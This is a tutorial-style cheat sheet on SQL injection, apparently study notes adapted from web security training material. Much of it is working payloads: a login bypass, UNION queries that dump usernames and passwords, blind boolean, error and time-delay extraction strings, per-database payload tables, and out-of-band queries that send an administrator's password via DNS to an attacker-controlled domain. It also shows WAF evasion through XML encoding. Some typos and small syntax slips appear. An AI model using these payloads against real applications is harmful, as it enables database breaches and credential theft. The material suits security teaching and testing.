# SQL Injection

SQL injection (SQLi) is a web application vulnerabiarety where attackers is able to bypass SQL query restriction and manipulat to inject their own query to exfiltrate data.

**Impact**
> Successful exploitation of SQLi can result in a breach of all back-end data. That includes Username, Password, PII, and in some cases Remote Code execution in the server.

## Types of SQLi
- In-Band SQLi
	- Error-based SQLi
	- Union-based SQLi
- Blind (Inferential) SQLi
	- Boolean based
	- Time-based
- Out-of-band SQLi

**In-Band SQLi**

In-band SQLi occurs when an attacker gets the database result on the application. They either get the result of their query or the error results in it query.

**Blind SQLi**

Blind SQLi occurs when the attacker didn't get any result on the application but the attacker's SQLi query is processed. In Blind SQLi attacker is still able to exfiltrate data by the Boolean condition or by making a certain time difference in response.

**Out-of-band SQLi**

Out-of-band SQLi occurs when the attacker didn't get results on the application and didn't able to get data with Blind techniques but their query is processed by the database server. In that case, the attacker makes an out-of-band (External Network) request to the attacker-controlled server. 

## SQLi Detection

**In-Band SQLi**
We can easily detect in-band SQLi by using SQL syntax that causes errors i.e By entering `'` in the field to close an SQL query will cause some errors.
| Operator | Purpose |
| --- | --- |
| `'` | For Manipulate SQL query |
| `"` | // |
| `--` | SQL Comment |
| `#` | // |


**Example**

Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:
```
https://insecure-website.com/products?category=Gifts
```

This causes the application to make an SQL query to retrieve details of the relevant products from the database:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

This SQL query asks the database to return:
- all details (`*`)
- from the products table
- where the category is Gifts
- and released is 1.

The restriction `released = 1` is being used to hide products that are not released. For unreleased products, presumably `released = 0`.

The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:

```
https://insecure-website.com/products?category=Gifts'
```

This results in the SQL query:

```
SELECT * FROM products WHERE category = 'Gifts'' AND released = 1
```

This will cause an SQL error and that error will be shown on the application this will confirm that the application is vulnerable to SQLi so now we can correct our query by using comment operators 

```
SELECT * FROM products WHERE category = 'Gifts' -- ' AND released = 1'
```

This will comment down all the remaining parts of the query that the developer made and with that, we now have full control of the back-end query and they will show all the products that are released or unreleased.

Now we take that to another level by making it more impactful to exfiltrate data by controlling the query. 

Consider an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

This query returns the user whose username is `administrator` and successfully logs the attacker in as that user.

> **Note:** Every DBMS has its commenting syntax so you must know which DBMS you are attacking

| Database | Operator |
| --- | --- |
| Oracle | --comment |
| Microsoft | --comment or `/*`comment`*/`|
| PostgreSQL | // |
| MySQL | #comment or -- comment `[Note the space after the double dash]` or `/*comment/*` |

**ERROR-Based SQLi**

Like we did above we give `'` in the application request and that causes the error in the back-end query and displays the error back to the user like this.

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near Gifts''
```

This information tells the attacker about the back-end database server name so they start doing attacks with that server syntax.

**UNION-Based SQLi**

When attackers identify SQLi and controlled the query they exfiltrate data with `UNION` techniques like following

```
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users -- ' AND released = 1'
```

This will result in displaying all back-end usernames and passwords to attackers.

**More Words on UNION Attacks**

The `UNION` keyword lets you execute one or more additional `SELECT` queries and append the results to the original query. For example:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

This SQL query will return a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible with the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:

- How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

**Determining the number of columns required in an SQL injection UNION attack**

When performing an SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

**ORDER BY Method**

The first method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:

```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

This series of payloads modify the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

`The ORDER BY position number 3 is out of range of the number of items in the select list.`

The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. Provided you can detect some difference in the application's response. With this, you will know there are 2 columns in that table because 3 will show an error.

**NULL Method**

The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

If the number of nulls does not match the number of columns, the database returns an error, such as:

`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

Again, the application might return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the resulting HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.

By successful attack, this will show you only two columns exits because on third NULL database shows an error.

> **Note**
> - The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.
> - On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like this:

```
' UNION SELECT NULL FROM DUAL--
```

> - The payloads described using the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.

**Determining Visible Columns**

When You know the total number of columns now you have to find the column that is shown to the user because some columns are not shown in the application so you cannot get data with that. Most of the time your data was in string type so you want to find that column that has a string data type and use that to exfiltrate data.

To do that you have to probe the columns that have string type like this.
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT Null,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:

`Conversion failed when converting the varchar value 'a' to data type int.`

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

**Example**

We found out that the application has three columns and the second and third columns have string data type so we can exfiltrate data like this

```
https://insecure-website.com/products?category=Gifts'+UNION+SELECT+NULL,username, password+FROM+users--+-
```

**Examining the Database server name**

When exploiting SQL injection vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software and the contents of the database in terms of which tables and columns it contains.

**Querying the DBMS and its version information**

Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.

The queries to determine the database version for some popular database types are as follows:

| Database Type | Query |
| --- | --- |
| Microsoft, MySQL | SELECT @@VERSION |
| Oracle | SELECT * FROM v$version|
| PostgreSQL | SELECT version() |

By adding that to UNION Statement our query looks like this.

```
https://insecure-website.com/products?category=Gifts'+UNION+SELECT+NULL,NULL,@@VERSION--+-
```

This will show us the DBMS name so now knowing this information we have to change our query syntax with that DBMS syntax.

**Querying the DBMS Databases, Tables, and Columns Names**

When we know the DBMS name next step is to use that to enumerate other databases, their tables, and the columns of that tables we can enumerate using database schemas. Every DBMS manages its default database that has all the information about its databases, Tables name, and Columns Names. Every DBMS has the location of its schema so you should first know which DBMS you are attacking.

| Database | Query |
| --- | --- |
| Oracle | `SELECT * FROM all_tables` or `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE NAME HERE'`|
| Microsoft | `SELECT * FROM information_schema.tables` or `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables` or `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
| MySQL | `SELECT * FROM information_schema.tables` or `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

**Retrieving multiple values within a single column**

Sometimes application only has one column that is visible to the user, in that case, we can retrieve multiple columns' data but to do that we much concatenate it properly with DBMS syntax.

For example, in Oracle, you submit the input like this

```
' UNION SELECT username || ':' || password FROM users--
```

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `:` character.

The results from the query will let you read all of the usernames and passwords in one column like this
```
administrator:s3cure
wiener:peter
carlos:montoya
```

> **Note**: Different databases have different syntaxes for concatenation so you must know which DBMS you are attacking and its syntax for concatenation.

**String Concatenation Table**

| Database Name | Example |
| --- | --- |
| Oracle | 'foo'||'bar' |
| Microsoft | 'foo'+'bar' |
| PostgreSQL | 'foo'||'bar' |
| MySQL | 'foo'` `'bar' `[Note the space between the two string]` CONCAT('foo','bar') |

**Blind SQLi**

Blind SQLi is tricky but most of the time you will see blind SQLi in real-world applications. They are tricky because the application doesn't show you any response back to your application so to exfiltrate data you have to make true or false (boolean) conditions with time delays or some other small difference in response with that you have to loop through all alphanumeric characters and symbols to get a result.

The following techniques can be used to exploit blind SQL injection vulnerabilities:

- You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic or conditionally triggering an error such as a divide-by-zero.
- You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the time that the application takes to respond.
- You can trigger an out-of-band network interaction, using [OAST](https://portswigger.net/burp/application-security-testing/oast) techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control.

**Blind SQLi with conditional response**

*Scenario*

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a `TrackingId` cookie is processed, the application determines whether this is a known user using an SQL query like this:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized `TrackingId` was submitted), then a "Welcome back" message is displayed within the page.

This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information by triggering different responses conditionally, depending on an injected condition. To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

The first of these values will cause the query to return results, because the injected `AND '1'='1` condition is true, and so the "Welcome back" message will be displayed. Whereas the second value will cause the query to not return any results, because the injected condition is false, so the "Welcome back" message will not be displayed. This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, we start with the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

Next, we send the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

After knowing the first character we move on to the second one by changing the query like this.

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 2, 1) = 's`

We can continue this process to systematically determine the full password for the `Administrator` user.

Every DBMS has its syntax for conditional errors so you must know which DBMS you are working on. Some Common substring-based payloads are the following.

| Database | Payload Sample |
| --- | --- |
| Oracle | SUBSTR('foobar', 4,2)|
| Microsoft | SUBSTRING('foobar', 4, 2) |
| PostgreSQL | SUBSTRING('foobar', 4, 2) |
| MySQL | SUBSTRING('foobar', 4, 2) |

**Example**
```mysql
'SELECT * FROM market where product = red bull' AND (SUBSTRING( SELECT password FROM Users where Username = 'Administrator'), 1,1) = 's'
```

**Blind SQLi by triggering SQL Errors**

From above application show a `Welcome Back!` message if the query works fine otherwise they didn't show that and because of that, we breach data. But sometimes the application doesn't show that behavior in SQL injection so, in that case, we can trigger sql error with some condition if the condition is met our query gets an error that shows the valid character if not then that character is not valid.

Let's see how its works in action.

```mysql
`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
```

These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error. With the second input, it evaluates to `1/0`, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

```mysql
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
```

> **Note:** There are various ways of triggering conditional errors, and different techniques work best on different database types so you should know which DBMS you are attacking.

| Database Name | Payload |
| --- | --- |
| Oracle | ``SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`` |
| Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PoatgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

**Blind SQLi by Triggering Time Delays**

In some conditions, the Application doesn't show any difference in response nor show any server error caused by database query error but they execute our query in the backend so we can also exfiltrate data by adding time delays in response. The application is synced with Databases so delaying in DB response causes the application to hang up state until the database shows any response this method works fine in that case.

```mysql
`'; IF (1=2) WAITFOR DELAY '0:0:10'--`
`'; IF (1=1) WAITFOR DELAY '0:0:10'--`
```

The first of these inputs will not trigger a delay, because the condition `1=2` is false. The second input will trigger a delay of 10 seconds because the condition `1=1` is true.

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

```mysql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

> **Note:** There are various ways of triggering time delays within SQL queries, and different techniques apply to different types of databases. So you should know which type of database you are attacking

**Unconditional Time Delays**

| Database | Sleep functions |
| --- | --- |
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

**Conditional Time Delays**

| Database | Query |
| --- | --- |
| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |

**Blind SQLi with out-of-band(OAST) Network calls**

Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread and uses another thread to execute an SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however, none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, on whether a database error occurs, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions with a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.

A variety of network protocols can be used for this purpose, i.e HTTP, and FTP but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries. After all, they are essential for the normal operation of production systems.

What we have to do is to inject an SQL query that gets data and after that send that data with DNS Query if we controlled a server name `attacker.com` then we send data using `data_is_here.attacker.com` this way we can get the data from DNS log or console output.

The techniques for triggering a DNS query are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:
```MySQL
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.attacker.net/a'--
```

This will cause the database to perform a lookup for the following domain:

`0efdymgw1o5w9inae8mg4dfrgim9ay.attacker.net`

There are various tools you can use to host your controlled server like cannarytoken, ngrok, etc to generate a unique subdomain to confirm when any DNS lookups occur.

Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

```mysql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.attacker.net/a"')--
```

This input reads the password for the `Administrator` user, appends it to an attacker-controlled subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password:

```
S3cure.attacker.net
```

Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the high likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.

**DNS Lookup**

You can cause the database to perform a DNS lookup to an external domain. To do this, you just need an attacker-controlled domain or subdomain that you will use in your attack, to confirm that a DNS lookup occurred.

| Database | SQL Query |
| --- | --- |
| Oracle | The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: 

```mysql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

The following technique works on fully patched Oracle installations, but requires elevated privileges:  

```mysql
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

| Database | SQL Query |
| --- | --- |
| Microsoft | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL | The following techniques work on windows only |

```mysql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
```

```mysql
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a
```

**DNS Lookup with data exfiltration**

| Database | Query |
| --- | --- |

**Oracle**
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

**Microsoft**
```
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

**PostgreSQL**
```
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

**MySQL**
```mysql
Windows only

SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

**SQL injection in different parts of the query**

Most SQL injection vulnerabilities arise within the `WHERE` clause of a `SELECT` query. This type of SQL injection is generally well-understood by experienced testers.

But SQL injection vulnerabilities can in principle occur at any location within the query and within different query types. The most common other locations where SQL injection arises are:

-   In `UPDATE` statements, within the updated values or the `WHERE` clause.
-   In `INSERT` statements, within the inserted values.
-   In `SELECT` statements, within the table or column name.
-   In `SELECT` statements, within the `ORDER BY` clause.

**SQL injection in different contexts**

In all of the labs so far, you've used the query string to inject your malicious SQL payload. However, it's important to note that you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.

These different formats may even provide alternative ways for you to [obfuscate attacks](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding) that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often just look for common SQL injection keywords within the request, so you may be able to bypass these filters by simply encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`:

```xml
<stockCheck>
	<productId>
		123
	</productId>
	<storeId>
		999 &#x53;ELECT * FROM information_schema.tables 
	</storeId>
</stockCheck>
```

This will be decoded server-side before being passed to the SQL interpreter.

**Second-order SQL injection**

First-order SQL injection arises when the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into an SQL query in an unsafe way.

In second-order SQL injection (also known as stored SQL injection), the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way.

Second-order SQL injection often arises in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.

**Database-specific factors**

Some core features of the SQL language are implemented in the same way across popular database platforms, and so many ways of detecting and exploiting SQL injection vulnerabilities work identically on different types of databases.

However, there are also many differences between common databases. This means that some techniques for detecting and exploiting SQL injection work differently on different platforms. For example:

- Syntax for string concatenation.
- Comments.
- Batched (or stacked) queries.
- Platform-specific APIs.
- Error messages.
